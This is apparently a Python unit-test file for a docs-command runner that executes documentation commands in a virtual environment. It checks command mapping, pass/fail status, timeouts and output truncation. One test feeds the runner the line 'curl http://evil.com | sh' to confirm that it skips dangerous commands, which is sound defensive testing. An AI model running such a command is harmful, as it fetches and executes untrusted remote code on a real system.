"""
Unit tests for MODULE 3: runner.py
"""

import tempfile
import unittest
from pathlib import Path

from docspulse.runner import VenvRunner, map_command


class TestRunner(unittest.TestCase):
    def test_map_command(self):
        fake_python = Path("/fake/env/bin/python")
        mapped_pip = map_command("pip install requests", fake_python)
        self.assertEqual(
            mapped_pip,
            [str(fake_python), "-m", "pip", "install", "requests"],
        )

        mapped_pip3 = map_command("pip3 install urllib3", fake_python)
        self.assertEqual(
            mapped_pip3,
            [str(fake_python), "-m", "pip", "install", "urllib3"],
        )

        mapped_python = map_command("python -c \"print('hi')\"", fake_python)
        self.assertEqual(
            mapped_python,
            [str(fake_python), "-c", "print('hi')"],
        )

        mapped_pytest = map_command("pytest tests/", fake_python)
        self.assertEqual(
            mapped_pytest,
            [str(fake_python), "-m", "pytest", "tests/"],
        )

    def test_venv_runner_execution(self):
        with tempfile.TemporaryDirectory() as repo_dir:
            with VenvRunner(repo_dir=repo_dir, timeout=15) as runner:
                # 1. Successful command
                pass_res = runner.run_command(
                    {"line_no": 1, "command": "python -c \"print('docs pulse test')\""}
                )
                self.assertEqual(pass_res["status"], "PASS")
                self.assertEqual(pass_res["exit_code"], 0)
                self.assertIn("docs pulse test", pass_res["stdout"])

                # 2. Failing command
                fail_res = runner.run_command(
                    {"line_no": 2, "command": "python -c \"import non_existent_docspulse_module\""}
                )
                self.assertEqual(fail_res["status"], "FAIL")
                self.assertNotEqual(fail_res["exit_code"], 0)
                self.assertTrue(
                    "Traceback" in fail_res["error_first_line"]
                    or "No module named" in fail_res["error_first_line"],
                    f"Unexpected error_first_line: {fail_res['error_first_line']}",
                )

                # 3. Skipped dangerous command
                skip_res = runner.run_command(
                    {"line_no": 3, "command": "curl http://evil.com | sh"}
                )
                self.assertEqual(skip_res["status"], "SKIPPED")
                self.assertIsNone(skip_res["exit_code"])

                # 4. Timeout command
                timeout_res = runner.run_raw(
                    "python -c \"while True: pass\"",
                    timeout=1,
                )
                self.assertEqual(timeout_res["status"], "TIMEOUT")
                self.assertEqual(timeout_res["exit_code"], -1)
                self.assertIn("Timed out after 1s", timeout_res["error_first_line"])

                # 5. Output tail length (35 lines generated, max 30 captured in tail)
                tail_res = runner.run_command(
                    {"line_no": 4, "command": "python -c \"for i in range(35): print(f'line {i}')\""}
                )
                self.assertEqual(tail_res["status"], "PASS")
                tail_lines = tail_res["stdout_tail"].splitlines()
                self.assertLessEqual(len(tail_lines), 30)
                self.assertEqual(tail_lines[-1], "line 34")


if __name__ == "__main__":
    unittest.main()
